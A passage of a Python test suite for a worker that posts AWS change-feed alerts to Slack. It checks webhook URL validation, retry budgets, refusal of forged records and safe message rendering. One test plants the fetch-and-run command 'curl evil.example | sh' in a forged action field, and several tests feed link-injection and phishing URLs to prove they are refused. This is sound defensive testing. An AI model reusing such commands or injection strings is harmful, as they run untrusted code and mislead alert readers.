        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "webhook_url_rejected")

    def test_a_webhook_secret_on_an_https_but_unapproved_host_is_never_sent(self):
        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, "https://evil.example/services/T/B/S")}
        )
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_a_webhook_secret_without_the_services_path_is_never_sent(self):
        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, "https://hooks.slack.com/not-services/T/B/S")}
        )
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_the_rejection_record_does_not_carry_the_webhook_url(self):
        """Chapter 04: never log the URL. It is the secret."""

        secret_url = "https://evil.example/services/TOPSECRET/BOTSECRET/SIGNINGSECRET"
        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, secret_url)}
        )
        self.queued_record()

        result = self.process()

        record = self.record()
        self.assertNotIn("SIGNINGSECRET", json.dumps(record.slack_response))
        self.assertNotIn("SIGNINGSECRET", result.reason or "")
        self.assertNotIn("evil.example", result.reason or "")

    def test_a_credential_of_the_wrong_kind_is_never_sent(self):
        """The secret container is mutable state no schema governs."""

        from aws_public_change_feed.credentials import BOT_TOKEN

        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(BOT_TOKEN, "xoxb-not-a-webhook")}
        )
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "credential_kind_mismatch")

    def test_a_valid_webhook_secret_still_reaches_the_sender(self):
        """The check is a gate, not a wall: the committed secret passes it."""

        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, POSTED)
        self.assertEqual(len(self.sender.calls), 1)


class NetworkAttemptBudgetTests(WorkerFixture):
    """Chapter 06: a queue receive that makes no Slack call spends no attempt.

    ADR-004 keeps the SQS receive count and the Slack network-attempt counter
    separate so that redelivery before a network call cannot exhaust the Slack
    budget. Every failure below happens after the `sending` claim but before
    the one permitted call, and each previously wrote an incremented counter to
    a record that had contacted nothing.
    """

    def assert_no_attempt_spent(self, result):
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])
        self.assertEqual(self.record().network_attempt_count, 0)

    def test_a_credential_read_failure_spends_no_attempt(self):
        self.credentials = RecordingCredentials({}, fail_on=self.route["credential_secret_id"])
        self.queued_record()

        self.assert_no_attempt_spent(self.process())

    def test_a_rejected_webhook_secret_spends_no_attempt(self):
        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, "http://evil.example/services/T/B/S")}
        )
        self.queued_record()

        self.assert_no_attempt_spent(self.process())

    def test_an_unsafe_source_url_spends_no_attempt(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["url"] = "https://evil.example/phish"
        self.queued_record(request=build_delivery_request(candidate, self.destination_key, NOW))

        self.assert_no_attempt_spent(self.process())

    def test_a_prior_count_is_preserved_rather_than_incremented(self):
        """The counter is written back unchanged, not merely left low."""

        self.credentials = RecordingCredentials({}, fail_on=self.route["credential_secret_id"])
        self.queued_record(network_attempt_count=3)

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.record().network_attempt_count, 3)

    def test_a_real_slack_call_does_spend_an_attempt(self):
        """The paired case: the increment still happens where it should."""

        self.queued_record(network_attempt_count=3)

        result = self.process()

        self.assertEqual(result.state, POSTED)
        self.assertTrue(result.performed_network_call)
        self.assertEqual(self.record().network_attempt_count, 4)


class UnsafeSourceUrlDeliveryTests(WorkerFixture):
    """A stored source URL that fails policy is terminal, not a Slack call."""

    def test_an_edited_source_url_is_refused_by_the_semantics_check(self):
        """Two independent guards catch this; the outer one fires first.

        `candidate_id` does not cover the URL — it derives from revision,
        service, risk, route, and audience — so the record's own ID stays
        valid. `announcement_id` *is* the digest of the canonical URL, so the
        release-relative semantics check catches the edit before rendering
        begins, and reports it as a candidate that disagrees with its release.

        `SourceUrlTests` holds the renderer's own check, which stays because
        it is unskippable by construction: a caller that reaches
        `render_message` by another path still cannot turn an unvalidated URL
        into a Slack link.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["url"] = "https://evil.example/phish"
        self.assertEqual(candidate["candidate_id"], self.key)
        self.queued_record(request=build_delivery_request(candidate, self.destination_key, NOW))

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "candidate_disagrees_with_release")

    def forged(self, **mutations):
        """A stored request whose candidate was edited after emission.

        Every identity digest and release hash is left intact, because none of
        them covers the fields being changed. That is the point: the schema
        check and the identity check both pass, and only the release-relative
        semantics check can tell that the content is not what the release says.
        """

        candidate = copy.deepcopy(self.candidate)
        for path, value in mutations.items():
            target = candidate
            *parents, leaf = path.split(".")
            for part in parents:
                target = target[part]
            target[leaf] = value
        self.assertEqual(candidate["candidate_id"], self.key)
        self.assertEqual(candidate["release"], self.candidate["release"])
        self.queued_record(request=build_delivery_request(candidate, self.destination_key, NOW))
        return self.process()

    def test_a_forged_high_priority_mention_is_refused(self):
        """The worst case: escalation the release never authorized.

        A `high` priority makes the renderer attach the route's configured
        user-group mention, so an edit here pages whoever that group is.
        """

        result = self.forged(**{"risk.priority": "high"})

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "candidate_disagrees_with_release")

    def test_a_forged_recommended_action_is_refused(self):
        """The field that tells a human what to do about the alert."""

        result = self.forged(recommended_action="Run this: curl evil.example | sh")

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_a_forged_service_display_name_is_refused(self):
        result = self.forged(**{"service.display_name": "Totally Different Service"})

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_a_forged_explanation_is_refused(self):
        """The evidence a reader uses to judge whether the match is real."""

        result = self.forged(**{"explainability.reason": "Because an attacker said so"})

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_a_forged_risk_type_is_refused(self):
        result = self.forged(**{"risk.risk_type": "security"})

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_forged_matched_evidence_is_refused(self):
        """Evidence is re-derived from the announcement, not trusted."""

        result = self.forged(**{"explainability.matched_terms": ["fabricated"]})

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_a_forged_environment_set_is_refused(self):
        """Route isolation: the audience is re-derived from the release."""

        result = self.forged(environment_ids=["env-prod-eu", "env-prod-us", "env-staging-us"])

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_the_unmodified_committed_candidate_still_posts(self):
        """The paired case: the check is a gate, not a wall.

        Without this, every test above would pass against a worker that
        refused everything.
        """

        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, POSTED)
        self.assertEqual(len(self.sender.calls), 1)

    def test_an_oversize_message_is_terminal_rather_than_sent(self):
        body = {**self.config["message_policy"], "max_message_characters": 1000}
        config_body = yaml.safe_dump(
            {**load_yaml("config.yaml"), "message_policy": body},
            sort_keys=False,
        ).encode()
        self._publish_release(config_body=config_body)
        self._build_candidate_and_request()
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "render_message_too_large")


class RenderLimitTests(WorkerFixture):
    """A render that exceeds `max_blocks` is terminal, not a Slack call."""

    def test_a_render_exceeding_max_blocks_records_failed_terminal(self):
        body = self.config["message_policy"].copy()
        body["max_blocks"] = 1
        config_body = yaml.safe_dump(
            {**load_yaml("config.yaml"), "message_policy": body},
            sort_keys=False,
        ).encode()
        self._publish_release(config_body=config_body)
        self._build_candidate_and_request()
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        record = self.record()
        self.assertEqual(record.status, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])


class RefusalTests(WorkerFixture):
    """The worker fails closed rather than render unverified display data."""

    def test_an_invalid_delivery_request_is_returned_unprocessed(self):
        self.queued_record()
        self.store._deliveries[self.key] = DeliveryRecord(
            candidate_id=self.key,
            destination_key=self.destination_key,
            request={**self.request, "request_id": "not-a-digest"},
            next_action_at=NOW_TS,
            status="queued",
            state_version=1,
            created_at=self.request["created_at"],
        )

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(self.sender.calls, [])

    def test_an_embedded_release_with_a_wrong_release_id_is_returned_unprocessed(self):
        self.queued_record()
        candidate = copy.deepcopy(self.candidate)
        candidate["release"]["release_id"] = "f" * 64
        self.store._deliveries[self.key] = DeliveryRecord(
            candidate_id=self.key,
            destination_key=self.destination_key,
            request=build_delivery_request(candidate, self.destination_key, NOW),
            next_action_at=NOW_TS,
            status="queued",
            state_version=1,
            created_at=self.request["created_at"],
        )

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(self.sender.calls, [])

    def test_a_route_missing_from_inventory_is_returned_unprocessed(self):
        self.queued_record()
        candidate = copy.deepcopy(self.candidate)
        candidate["route_id"] = "no-such-route"
        self.store._deliveries[self.key] = DeliveryRecord(
            candidate_id=self.key,
            destination_key=self.destination_key,
            request=build_delivery_request(candidate, self.destination_key, NOW),
            next_action_at=NOW_TS,
            status="queued",
            state_version=1,
            created_at=self.request["created_at"],
        )

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(self.sender.calls, [])

    def test_a_destination_disagreeing_with_the_inventory_route_is_returned_unprocessed(self):
        self.queued_record()
        self.store._deliveries[self.key] = DeliveryRecord(
            candidate_id=self.key,
            destination_key="wrong-destination",
            request=self.request,
            next_action_at=NOW_TS,
            status="queued",
            state_version=1,
            created_at=self.request["created_at"],
        )

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(self.sender.calls, [])


class RenderMessageTests(unittest.TestCase):
    """`render_message` produces bounded, plain-text-safe Slack blocks."""

    def setUp(self):
        self.candidate = load_json("alert-candidate.json")
        self.inventory = load_json("inventory.json")
        self.policy = load_yaml("config.yaml")["message_policy"]

    def render(self, candidate=None, inventory=None, policy=None, **kwargs):
        return render_message(
            self.candidate if candidate is None else candidate,
            self.inventory if inventory is None else inventory,
            message_policy=self.policy if policy is None else policy,
            approved_source_hosts=SOURCE_HOSTS,
            **kwargs,
        )

    def plain_texts(self, payload):
        """Every `plain_text` string in the payload, blocks and elements."""

        found = []
        for block in payload["blocks"]:
            text_object = block.get("text")
            if isinstance(text_object, dict) and text_object.get("type") == "plain_text":
                found.append(text_object["text"])
            for element in block.get("elements", ()):
                if element.get("type") == "plain_text":
                    found.append(element["text"])
        return found

    def test_the_payload_carries_fallback_and_blocks(self):
        payload = self.render()

        self.assertIn("text", payload)
        self.assertIn("blocks", payload)
        self.assertIsInstance(payload["text"], str)
        self.assertIsInstance(payload["blocks"], list)
        self.assertGreater(len(payload["blocks"]), 0)

    def test_the_fallback_string_names_the_candidate_id(self):
        payload = self.render()

        self.assertIn(self.candidate["candidate_id"], json.dumps(payload))

    def test_a_high_priority_candidate_mentions_the_configured_usergroup(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["risk"]["priority"] = "high"

        payload = self.render(candidate, usergroup_id="SRETEAM01")

        joined = json.dumps(payload)
        self.assertIn("SRETEAM01", joined)
        self.assertIn("<!subteam^SRETEAM01>", joined)

    def test_a_medium_priority_candidate_does_not_mention_a_usergroup(self):
        payload = self.render(usergroup_id="SRETEAM01")

        self.assertNotIn("SRETEAM01", json.dumps(payload))

    def test_control_characters_in_the_title_remain_literal_plain_text(self):
        """A plain-text title needs no Slack entity escaping."""

        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["title"] = "A & B <C> D"

        payload = self.render(candidate)

        title_block = payload["blocks"][1]["text"]
        self.assertEqual(title_block["type"], "plain_text")
        self.assertEqual(title_block["text"], "A & B <C> D")

    def test_the_fallback_disables_markdown_and_so_needs_no_escaping(self):
        """`mrkdwn: false` is the stronger control, so escaping would only harm.

        Escaping this field protected against links and mentions while leaving
        `*bold*` and backticks live — the same half-measure that made the
        summary unsafe in its `mrkdwn` block. Turning parsing off covers all
        of it, and then an escape sequence would just be four characters the
        reader sees instead of one.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["title"] = "A & B <C> D"
        candidate["announcement"]["summary"] = "Use *bold* and `code`"

        payload = self.render(candidate)

        self.assertIs(payload["mrkdwn"], False)
        self.assertIn("A & B <C> D", payload["text"])
        self.assertNotIn("&lt;", payload["text"])
        self.assertNotIn("&amp;", payload["text"])

    def test_plain_text_blocks_are_not_escaped(self):
        """Escaping a `plain_text` object shows the reader the escape itself.

        Slack does not parse `plain_text`, so `&lt;` there is four literal
        characters on screen rather than a `<`. Chapter 04 puts untrusted
        content in these blocks precisely so it needs no escaping, and
        escaping it anyway corrupted every summary mentioning `<` or `&`.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["recommended_action"] = "Compare <old> & <new> capacity"

        payload = self.render(candidate)

        action = [text for text in self.plain_texts(payload) if text.startswith("Recommended review action")]
        self.assertEqual(len(action), 1)
        self.assertIn("Compare <old> & <new> capacity", action[0])
        self.assertNotIn("&lt;", action[0])
        self.assertNotIn("&amp;", action[0])

    def test_the_summary_is_a_plain_text_block_not_mrkdwn(self):
        """Untrusted feed text must not sit where Slack parses formatting.

        Escaping `&`, `<`, and `>` blocks links and mentions but leaves
        `*bold*`, `_italics_`, backtick code spans, and `>` quoting live. A
        summary in an `mrkdwn` block could therefore still dictate how the
        message rendered — enough to dress feed text up as a system notice.
        Chapter 04 asks for untrusted content in `plain_text`, which Slack
        does not parse at all.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["summary"] = "Use *bold* and `code` and _italics_ and >quote"

        payload = self.render(candidate)

        mrkdwn = [
            block["text"]["text"]
            for block in payload["blocks"]
            if isinstance(block.get("text"), dict) and block["text"]["type"] == "mrkdwn"
        ]
        for text in mrkdwn:
            self.assertNotIn("*bold*", text)
            self.assertNotIn("`code`", text)
        self.assertIn(candidate["announcement"]["summary"], self.plain_texts(payload))

    def test_the_feed_title_is_plain_text_and_the_source_link_uses_a_fixed_label(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["title"] = "*URGENT SYSTEM NOTICE* use `code`"

        payload = self.render(candidate)

        self.assertIn(candidate["announcement"]["title"], self.plain_texts(payload))
        mrkdwn = [
            block["text"]["text"]
            for block in payload["blocks"]
            if isinstance(block.get("text"), dict) and block["text"]["type"] == "mrkdwn"
        ]
        self.assertEqual(len(mrkdwn), 1)
        self.assertIn(f"<{candidate['announcement']['url']}|View source>", mrkdwn[0])
        self.assertNotIn(candidate["announcement"]["title"], mrkdwn[0])

    def test_the_mrkdwn_block_holds_a_fixed_link_and_the_release_names(self):
        """The one parsed section has no feed-derived display text."""

        payload = self.render()

        mrkdwn = [
            block["text"]["text"]
            for block in payload["blocks"]
            if isinstance(block.get("text"), dict) and block["text"]["type"] == "mrkdwn"
        ]
        self.assertEqual(len(mrkdwn), 1)
        lines = mrkdwn[0].splitlines()
        self.assertEqual(len(lines), 2)
        self.assertEqual(lines[0], f"<{self.candidate['announcement']['url']}|View source>")
        self.assertIn(self.candidate["service"]["display_name"], lines[1])

    def test_an_untrusted_title_never_reaches_the_parsed_link(self):
        """Feed text with link syntax remains literal plain text."""

        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["title"] = "Real|https://evil.example> <https://evil.example|Click here"

        payload = self.render(candidate)

        title_block = payload["blocks"][1]["text"]
        self.assertEqual(title_block["type"], "plain_text")
        self.assertEqual(title_block["text"], candidate["announcement"]["title"])
        link_text = payload["blocks"][2]["text"]["text"].splitlines()[0]
        self.assertEqual(link_text, f"<{candidate['announcement']['url']}|View source>")

    def test_the_fallback_carries_the_whole_alert(self):
        """Slack announces this field to screen readers, so it must be complete.

        It previously held the title, service, risk, reason, environments, and
        action, and omitted the summary, source URL, timestamp, and candidate
        ID — so the accessible rendering was the incomplete one, and the
        candidate ID a reader would quote in support was only in a block.
        """

        payload = self.render()

        fallback = payload["text"]
        self.assertIn(self.candidate["announcement"]["title"], fallback)
        self.assertIn(self.candidate["announcement"]["summary"], fallback)
        self.assertIn(self.candidate["announcement"]["url"], fallback)
        self.assertIn(self.candidate["candidate_id"], fallback)
        self.assertIn(self.candidate["service"]["display_name"], fallback)
        self.assertIn(self.candidate["risk"]["risk_type"], fallback)
        self.assertIn(self.candidate["recommended_action"], fallback)
        self.assertIn(self.candidate["explainability"]["reason"], fallback)

    def test_the_fallback_is_still_bounded(self):
        """Completeness does not exempt it from the message budget."""

        payload = self.render()

        self.assertLessEqual(len(payload["text"]), self.policy["max_message_characters"])

    def test_a_long_title_is_truncated_with_a_marker(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["title"] = "x" * 500

        payload = self.render(candidate)

        joined = json.dumps(payload, ensure_ascii=False)
        self.assertNotIn("x" * 200, joined)
        self.assertIn("\u2026", joined)

    def test_the_environment_summary_caps_at_the_configured_maximum(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["environment_ids"] = [f"env-{i:02d}" for i in range(40)]
        inventory = copy.deepcopy(self.inventory)
        inventory["environments"] = [
            {
                "id": f"env-{i:02d}",
                "customer": f"Customer {i}",
                "account_id": "0",
                "regions": ["us-east-1"],
                "route_id": "shared-alerts",
            }
            for i in range(40)
        ]

        payload = self.render(
            candidate,
            inventory,
            {**self.policy, "max_potentially_relevant_environments_in_slack": 5},
        )

        joined = json.dumps(payload)
        self.assertIn("and 35 more", joined)

    def test_a_single_oversized_label_becomes_a_count_rather_than_a_blob(self):
        """One customer name longer than the whole summary budget.

        Well past the inventory schema's 100-character maximum, so this is a
        corrupt-data case rather than a large-audience one. Showing a count
        beats showing 2000 characters of one mangled name, and either beats
        letting it set the message size.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["environment_ids"] = ["env-a"]
        inventory = copy.deepcopy(self.inventory)
        inventory["environments"] = [
            {
                "id": "env-a",
                "customer": "A" * 3000,
                "account_id": "0",
                "regions": [],
                "route_id": "shared-alerts",
            }
        ]

        payload = self.render(candidate, inventory)

        joined = json.dumps(payload, ensure_ascii=False)
        self.assertNotIn("A" * 200, joined)
        self.assertIn("1 potentially relevant environments", joined)
        self.assertLessEqual(
            sum(len(text) for text in _text_objects(payload)),
            self.policy["max_message_characters"],
        )

    def test_the_header_block_uses_mrkdwn_for_mention_support(self):
        payload = self.render()

        header_block = payload["blocks"][0]
        element = header_block["elements"][0]
        self.assertEqual(element["type"], "mrkdwn")
        self.assertNotIn("emoji", element)

    def test_the_committed_candidate_renders_within_the_committed_limits(self):
        """The canonical bundle must survive its own message policy."""

        payload = self.render()

        rendered = len(payload["text"]) + sum(
            len(text)
            for block in payload["blocks"]
            for text in ([block["text"]["text"]] if isinstance(block.get("text"), dict) else [])
            + [element["text"] for element in block.get("elements", ())]
        )
        self.assertLessEqual(rendered, self.policy["max_message_characters"])


class MessageSizeTests(unittest.TestCase):
    """Chapter 04: truncate deterministically, then refuse what is still over.

    The blocks carry the same content as the fallback and are not bounded in
    aggregate by any per-field cap, so measuring the fallback alone measured
    the one part of the payload that could not overflow.
    """

    def setUp(self):
        self.candidate = load_json("alert-candidate.json")
        self.inventory = load_json("inventory.json")
        self.policy = load_yaml("config.yaml")["message_policy"]

    def test_a_message_over_max_message_characters_is_refused(self):
        with self.assertRaises(MessageTooLarge) as caught:
            render_message(
                self.candidate,
                self.inventory,
                message_policy={**self.policy, "max_message_characters": 1000},
                approved_source_hosts=SOURCE_HOSTS,
            )

        self.assertIn("max_message_characters", str(caught.exception))

    def large_audience(self, count=30, name_length=100):
        """A candidate whose audience is large but entirely schema-valid.

        `name_length` defaults to the inventory schema's maximum for a
        customer name, so nothing here is malformed — this is the shape a real
        deployment reaches by acquiring customers.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["environment_ids"] = [f"env-{i:02d}" for i in range(count)]
        inventory = copy.deepcopy(self.inventory)
        inventory["environments"] = [
            {
                "id": f"env-{i:02d}",
                "customer": f"Customer {i} ".ljust(name_length, "X")[:name_length],
                "account_id": "0",
                "regions": ["us-east-1"],
                "route_id": "shared-alerts",
            }
            for i in range(count)
        ]
        return candidate, inventory

    def test_a_large_valid_audience_is_delivered_rather_than_refused(self):
        """Thirty environments at the schema's maximum name length.

        This case previously rendered to 4,977 characters and raised under the
        committed 4,000-character policy, which would have made a real alert
        `failed_terminal` and delivered it to nobody. Chapter 04 asks for
        deterministic truncation before refusal, and the environment list is
        the field that yields.
        """

        candidate, inventory = self.large_audience()

        payload = render_message(
            candidate,
            inventory,
            message_policy=self.policy,
            approved_source_hosts=SOURCE_HOSTS,
        )

        rendered = sum(len(text) for text in _text_objects(payload))
        self.assertLessEqual(rendered, self.policy["max_message_characters"])
        # The count of what was dropped stays visible: chapter 04 forbids
        # silent omission, and this is the opposite of silent.
        self.assertIn("more)", json.dumps(payload))

    def test_maximum_summary_and_every_audience_size_fit_the_committed_policy(self):
        """Every supported audience size fits the committed message policy.

        The 300-character summary cap leaves enough headroom that this sweep
        does not detect a single-label accounting regression. The next test,
        with its tighter legacy policy, owns that arithmetic check.
        """

        for count in range(1, 501):
            with self.subTest(environment_count=count):
                candidate, inventory = self.large_audience(count=count)
                candidate["announcement"]["summary"] = "s" * self.policy["max_summary_characters"]

                payload = render_message(
                    candidate,
                    inventory,
                    message_policy=self.policy,
                    approved_source_hosts=SOURCE_HOSTS,
                )

                self.assertLessEqual(
                    sum(len(text) for text in _text_objects(payload)),
                    self.policy["max_message_characters"],
                )

    def test_environment_label_is_reserved_before_the_summary_budget_is_halved(self):
        candidate, inventory = self.large_audience(count=10)
        candidate["announcement"]["summary"] = "s" * 1200
        legacy_policy = {
            **self.policy,
            "max_summary_characters": 1200,
            "max_message_characters": 3500,
        }

        payload = render_message(
            candidate,
            inventory,
            message_policy=legacy_policy,
            approved_source_hosts=SOURCE_HOSTS,
        )

        self.assertLessEqual(sum(len(text) for text in _text_objects(payload)), legacy_policy["max_message_characters"])

    def test_the_blocks_drive_the_shrink_and_not_only_the_fallback(self):
        """A tighter total budget shows fewer environments.

        The fallback is truncated to the cap by construction, so a renderer
        that only measured `payload["text"]` would produce the same blocks at
        every budget. Holding the audience fixed and lowering only
        `max_message_characters` is what proves the blocks are on the scale.
        """

        candidate, inventory = self.large_audience()

        def visible_environments(max_characters):
            payload = render_message(
                candidate,
                inventory,
                message_policy={**self.policy, "max_message_characters": max_characters},
                approved_source_hosts=SOURCE_HOSTS,
            )
            summary = [t for t in _text_objects(payload) if t.startswith("Potentially relevant: ")][0]
            return summary.count("env-")

        roomy = visible_environments(4000)
        tight = visible_environments(2000)

        self.assertGreater(roomy, tight)
        self.assertGreater(tight, 0)

    def test_the_shrink_is_deterministic_and_a_prefix(self):
        """Same input, same summary; a smaller budget yields a prefix."""

        candidate, inventory = self.large_audience()

        def summary(max_characters):
            payload = render_message(
                candidate,
                inventory,
                message_policy={**self.policy, "max_message_characters": max_characters},
                approved_source_hosts=SOURCE_HOSTS,
            )
            return [t for t in _text_objects(payload) if t.startswith("Potentially relevant: ")][0]

        self.assertEqual(summary(4000), summary(4000))
        tight = summary(2000).split(" (and ")[0]
        roomy = summary(4000)
        self.assertTrue(roomy.startswith(tight), f"{tight!r} is not a prefix of {roomy!r}")

    def test_a_policy_whose_field_caps_exceed_the_total_is_still_refused(self):
        """The backstop survives: truncation cannot rescue every policy.

        Every value here is within the config schema's own range — summary,
        explanation, and recommended action each cap at 2000, and the total
        caps at 4000 — so a deployment can set per-field caps that sum past
        the whole-message budget without the schema objecting. Dropping
        environments cannot recover that, and chapter 04 says a message still
        over the contract is refused rather than shortened past its evidence.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["environment_ids"] = []
        candidate["announcement"]["summary"] = "s" * 2000
        candidate["explainability"]["reason"] = "r" * 2000
        candidate["recommended_action"] = "a" * 2000
        policy = {
            **self.policy,
            "max_summary_characters": 2000,
            "max_explanation_characters": 2000,
            "max_recommended_action_characters": 2000,
            "max_message_characters": 4000,
        }

        with self.assertRaises(MessageTooLarge) as caught:
            render_message(candidate, self.inventory, message_policy=policy, approved_source_hosts=SOURCE_HOSTS)

        self.assertIn("after truncation", str(caught.exception))

    def test_the_committed_policy_cannot_reach_that_refusal_on_its_own(self):
        """The paired case, so the one above is not read as routine.

        With the committed caps and no environments, the irreducible content
        is well inside the budget. Refusal needs a policy whose field caps
        were raised, which is why the environment list was the right field to
        make yield rather than the first thing to blame.
        """

        candidate = copy.deepcopy(self.candidate)
        candidate["environment_ids"] = []

        payload = render_message(
            candidate, self.inventory, message_policy=self.policy, approved_source_hosts=SOURCE_HOSTS
        )

        self.assertLess(
            sum(len(text) for text in _text_objects(payload)),
            self.policy["max_message_characters"],
        )

    def test_a_single_text_object_over_slacks_cap_is_refused(self):
        """Slack caps one text object at 3000 characters regardless of policy."""

        candidate = copy.deepcopy(self.candidate)
        candidate["explainability"]["reason"] = "r" * 5000

        with self.assertRaises(MessageTooLarge) as caught:
            render_message(
                candidate,
                self.inventory,
                # The per-field cap is raised past Slack's own limit so the
                # deterministic truncation cannot mask the object-level check.
                message_policy={
                    **self.policy,
                    "max_explanation_characters": 5000,
                    "max_message_characters": 100000,
                },
                approved_source_hosts=SOURCE_HOSTS,
            )

        self.assertIn("text object", str(caught.exception))


class SourceUrlTests(unittest.TestCase):
    """Chapter 04: source URLs pass canonical HTTPS policy before linking.

    A candidate arrives as bytes read back from the delivery table, and its ID
    derives from revision, service, risk, route, and audience — never from the
    URL. An edited record therefore keeps a valid identity while carrying any
    URL at all, which is why the check belongs at render time.
    """

    def setUp(self):
        self.candidate = load_json("alert-candidate.json")
        self.inventory = load_json("inventory.json")
        self.policy = load_yaml("config.yaml")["message_policy"]

    def render_with_url(self, url):
        candidate = copy.deepcopy(self.candidate)
        candidate["announcement"]["url"] = url
        return render_message(
            candidate,
            self.inventory,
            message_policy=self.policy,
            approved_source_hosts=SOURCE_HOSTS,
        )

    def test_the_committed_source_url_is_accepted(self):
        payload = self.render_with_url(self.candidate["announcement"]["url"])

        self.assertIn(self.candidate["announcement"]["url"], payload["blocks"][2]["text"]["text"])

    def test_an_unapproved_host_is_refused(self):
        with self.assertRaises(UnsafeSourceUrl):
            self.render_with_url("https://evil.example/phish")

    def test_a_plaintext_scheme_is_refused(self):
        with self.assertRaises(UnsafeSourceUrl):
            self.render_with_url("http://aws.amazon.com/about-aws/whats-new/x/")

    def test_a_user_info_component_is_refused(self):
        with self.assertRaises(UnsafeSourceUrl):
            self.render_with_url("https://aws.amazon.com@evil.example/x")

    def test_a_nondefault_port_is_refused(self):
        with self.assertRaises(UnsafeSourceUrl):
            self.render_with_url("https://aws.amazon.com:8443/x")

    def test_raw_link_delimiters_cannot_escape_the_source_link(self):
        with self.assertRaises(UnsafeSourceUrl):
            self.render_with_url("https://aws.amazon.com/path/> <https://evil.example|Click")

    def test_the_approved_host_set_derives_from_the_release_config(self):
        """The renderer's allowlist comes from the same release, not a caller."""

        from aws_public_change_feed.worker import _approved_source_hosts

        config = load_yaml("config.yaml")
        self.assertEqual(_approved_source_hosts(config), SOURCE_HOSTS)


class ValidateWebhookUrlTests(unittest.TestCase):
    """`validate_webhook_url` applies chapter 04's incoming-webhook controls."""

    APPROVED = ["hooks.slack.com"]

    def test_a_valid_slack_webhook_url_is_accepted(self):
        validated = validate_webhook_url(
            "https://hooks.slack.com/services/T0001/B0001/UN0000000000000000000000",
            approved_hosts=self.APPROVED,
        )

        self.assertEqual(validated.hostname, "hooks.slack.com")

    def test_a_non_https_url_is_refused(self):
        with self.assertRaises(InvalidSlackWebhook):
            validate_webhook_url(
                "http://hooks.slack.com/services/T/B/S",
                approved_hosts=self.APPROVED,
            )

    def test_an_unapproved_host_is_refused(self):
        with self.assertRaises(InvalidSlackWebhook):
            validate_webhook_url(
                "https://evil.example.com/services/T/B/S",
                approved_hosts=self.APPROVED,
            )

    def test_a_url_without_the_services_path_is_refused(self):
        with self.assertRaises(InvalidSlackWebhook):
            validate_webhook_url(
                "https://hooks.slack.com/not-services/T/B/S",
                approved_hosts=self.APPROVED,
            )

    def test_a_url_with_too_few_path_segments_is_refused(self):
        with self.assertRaises(InvalidSlackWebhook):
            validate_webhook_url(
                "https://hooks.slack.com/services/T/B",
                approved_hosts=self.APPROVED,
            )


class RetryDelayTests(unittest.TestCase):
    """`_retry_delay` is deterministic: same inputs, same output."""

    def test_the_same_candidate_and_attempt_produce_the_same_delay(self):
        from aws_public_change_feed.worker import _retry_delay

        first = _retry_delay(1, min_interval_seconds=10, max_retry_after_seconds=900, candidate_id="c1")
        second = _retry_delay(1, min_interval_seconds=10, max_retry_after_seconds=900, candidate_id="c1")

        self.assertEqual(first, second)

    def test_different_attempts_produce_different_delays(self):
        from aws_public_change_feed.worker import _retry_delay

        first = _retry_delay(1, min_interval_seconds=10, max_retry_after_seconds=900, candidate_id="c1")
        second = _retry_delay(2, min_interval_seconds=10, max_retry_after_seconds=900, candidate_id="c1")

